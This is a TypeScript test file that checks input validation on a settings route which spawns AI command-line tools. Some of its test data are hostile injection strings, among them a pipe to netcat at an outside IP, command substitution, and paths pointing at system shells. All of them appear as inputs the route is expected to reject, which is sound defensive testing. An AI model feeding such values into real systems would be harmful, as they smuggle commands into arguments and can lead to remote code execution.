import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import Fastify, { type FastifyInstance } from 'fastify';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { initDb, getDb } from '../store/db';
import { configRoutes } from './config';

// Security regression — PUT /api/config/ai-integrations accepts a `path`
// that is later spawned by the aiPrompt step. Without validation a
// caller could pivot from "edit settings" to RCE by pointing path at
// /bin/sh. These tests pin the defence:
//   • basename must equal the tool name (claude/codex/aider/gemini)
//   • path must be absolute (no PATH lookup of relative names)
//   • empty string still clears the override
//   • undefined still keeps the existing value
//
// Originally raised by an automated review on PR #4.

let tmp: string;
let app: FastifyInstance;

async function buildApp(): Promise<FastifyInstance> {
  const a = Fastify({ logger: false });
  // Stub the config file path env var so saveAiIntegrationsConfig writes
  // somewhere disposable. The route doesn't need any of the other
  // /api/config/* infrastructure to validate input.
  process.env.BUILDPILOT_CONFIG_PATH = join(tmp, 'config.json');
  await configRoutes(a);
  await a.ready();
  return a;
}

beforeEach(async () => {
  tmp = mkdtempSync(join(tmpdir(), 'bp-config-api-'));
  initDb(join(tmp, 'db.sqlite'));
  app = await buildApp();
});

afterEach(async () => {
  await app.close();
  try {
    getDb().close();
  } catch {
    // ignore
  }
  rmSync(tmp, { recursive: true, force: true });
  delete process.env.BUILDPILOT_CONFIG_PATH;
});

describe('PUT /api/config/ai-integrations — path validation', () => {
  it('accepts an absolute path whose basename matches the tool name', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { claude: { path: '/usr/local/bin/claude' } },
    });
    expect(res.statusCode).toBe(200);
  });

  it('accepts an empty string (clears the override)', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { claude: { path: '' } },
    });
    expect(res.statusCode).toBe(200);
  });

  it('accepts undefined path (per-tool PATCH — keep existing)', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { claude: { model: 'claude-opus-4-7' } },
    });
    expect(res.statusCode).toBe(200);
  });

  it('rejects an absolute path whose basename is /bin/sh (RCE pivot)', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { claude: { path: '/bin/sh' } },
    });
    expect(res.statusCode).toBe(400);
  });

  it('rejects an absolute path whose basename is /bin/bash', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { aider: { path: '/bin/bash' } },
    });
    expect(res.statusCode).toBe(400);
  });

  it('rejects a relative path (PATH lookup shadowing)', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { claude: { path: 'claude' } },
    });
    expect(res.statusCode).toBe(400);
  });

  it('rejects a relative path with a malicious basename', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { claude: { path: '../../bin/sh' } },
    });
    expect(res.statusCode).toBe(400);
  });

  it('rejects a path where basename matches the wrong tool', async () => {
    // /usr/local/bin/codex would be valid under `codex.path`, but
    // assigning it under `claude.path` should fail — each tool slot
    // pins its own basename.
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { claude: { path: '/usr/local/bin/codex' } },
    });
    expect(res.statusCode).toBe(400);
  });

  it('tolerates a trailing slash (basename still claude; spawn fails at run)', async () => {
    // POSIX semantics — trailing slash on a path doesn't change the
    // basename, so the security constraint still applies. spawn() will
    // fail at runtime because the path resolves to a directory, but
    // that's not a security issue.
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { claude: { path: '/usr/local/bin/claude/' } },
    });
    expect(res.statusCode).toBe(200);
  });

  it.each(['claude', 'codex', 'aider', 'gemini'] as const)(
    'enforces basename validation for %s slot independently',
    async (tool) => {
      const valid = await app.inject({
        method: 'PUT',
        url: '/api/config/ai-integrations',
        payload: { [tool]: { path: `/opt/bin/${tool}` } },
      });
      expect(valid.statusCode).toBe(200);

      const invalid = await app.inject({
        method: 'PUT',
        url: '/api/config/ai-integrations',
        payload: { [tool]: { path: '/bin/sh' } },
      });
      expect(invalid.statusCode).toBe(400);
    },
  );

  // ── Windows path support ────────────────────────────────────────────
  // node:path's isAbsolute() treats `C:\...` as absolute on every
  // platform — verified by reading the docs and the implementation —
  // so the validator accepts Windows-style absolute paths regardless
  // of where the server runs. basename() likewise normalises both
  // separators. Below tests pin the behaviour so a future "tighten
  // path validation" change can't silently break Windows installs.

  it('accepts a Windows-style absolute path with .exe extension', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { claude: { path: 'C:\\Program Files\\Claude\\claude.exe' } },
    });
    expect(res.statusCode).toBe(200);
  });

  it.each(['.exe', '.cmd', '.bat', '.ps1'])(
    'accepts a Windows-style absolute path with %s extension',
    async (ext) => {
      const res = await app.inject({
        method: 'PUT',
        url: '/api/config/ai-integrations',
        payload: { codex: { path: `C:\\Tools\\codex${ext}` } },
      });
      expect(res.statusCode).toBe(200);
    },
  );

  it('rejects a Windows-style path whose basename is cmd.exe (RCE pivot)', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { claude: { path: 'C:\\Windows\\System32\\cmd.exe' } },
    });
    expect(res.statusCode).toBe(400);
  });

  it('rejects a Windows-style path whose basename is powershell.exe', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: {
        aider: {
          path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        },
      },
    });
    expect(res.statusCode).toBe(400);
  });

  // ── model field validation ──────────────────────────────────────────
  // `model` flows verbatim into argv when aiPrompt spawns the CLI, so
  // it needs its own allowlist — without it a string like
  // "--dangerously-skip-permissions" lands as a separate argv entry
  // and is interpreted by claude/codex/aider/gemini as a flag.
  // Allowed character set [A-Za-z0-9._:/-] admits every real model
  // identifier we ship (claude-opus-4-7, gpt-4o, vendor/model:v1.2)
  // while rejecting shell metacharacters + `-` prefixes.

  it('accepts a realistic model identifier', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { claude: { model: 'claude-opus-4-7' } },
    });
    expect(res.statusCode).toBe(200);
  });

  it('accepts vendor-scoped model identifier with colon tag', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { codex: { model: 'openai/gpt-4o:2025-04' } },
    });
    expect(res.statusCode).toBe(200);
  });

  it('accepts empty model (clears override)', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { gemini: { model: '' } },
    });
    expect(res.statusCode).toBe(200);
  });

  it('rejects argv-injection via --flag', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { claude: { model: '--dangerously-skip-permissions' } },
    });
    expect(res.statusCode).toBe(400);
  });

  it('rejects argv-injection via space-separated extra arg', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { claude: { model: 'claude-opus-4-7 --verbose' } },
    });
    expect(res.statusCode).toBe(400);
  });

  it.each([
    ['shell metacharacter $', 'claude$(touch /tmp/p)'],
    ['shell metacharacter backtick', 'claude`id`'],
    ['shell pipe', 'claude | nc 1.2.3.4 8080'],
    ['null byte attempt', 'claude\0--evil'],
    ['unicode separator', 'claude arg'],
  ])('rejects model containing %s', async (_label, model) => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { claude: { model } },
    });
    expect(res.statusCode).toBe(400);
  });

  it('rejects model exceeding 128 characters', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/config/ai-integrations',
      payload: { claude: { model: 'a'.repeat(129) } },
    });
    expect(res.statusCode).toBe(400);
  });
});
